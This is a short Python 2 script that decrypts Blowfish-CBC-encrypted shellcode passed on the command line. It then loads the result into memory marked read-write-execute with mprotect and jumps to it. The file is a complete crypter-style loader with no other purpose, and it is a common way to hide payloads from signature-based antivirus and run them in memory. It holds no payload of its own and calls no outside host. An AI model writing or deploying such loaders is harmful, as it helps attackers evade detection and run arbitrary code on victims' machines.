#!/usr/bin/python
import argparse
from Crypto.Cipher import Blowfish
from Crypto import Random
from struct import pack
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

parser = argparse.ArgumentParser()
parser.add_argument('-c','--cipher_shellcode',help="Shellcode to be decrypted")
parser.add_argument('-k','--key',help="Key to be used for encryption/decryption")
args = parser.parse_args()

def decrypt(cText, key):
	bs      = Blowfish.block_size
 	iv	= cText[:bs]
	cText	= cText[bs:]
	cipher  = Blowfish.new(key, Blowfish.MODE_CBC, iv)
	pText	= cipher.decrypt(cText)
	last_byte = pText[-1]
	pText = pText[: -(last_byte if type(last_byte) is int else ord(last_byte))]
	return repr(pText)

def executeShellcode(shellcode):
	libc = CDLL('libc.so.6')
	shellcode = shellcode.replace('\\x','').decode('hex')
	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr,size,0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	run()

def formatShellcode(shellcode):
	formattedShellcode = []
	for i in shellcode:
		if i == 'x':
			formattedShellcode.append('\\')
			formattedShellcode.append(i)
		else:
			formattedShellcode.append(i)
	return formattedShellcode

print '[*]Decrypting Shellcode'
dec_shellcode = formatShellcode(decrypt(args.cipher_shellcode.decode('hex'), args.key))
final_shellcode =  ''.join(dec_shellcode).replace("'","")
print 'Decrypted Shellcode:  ' +  final_shellcode
executeShellcode(final_shellcode)
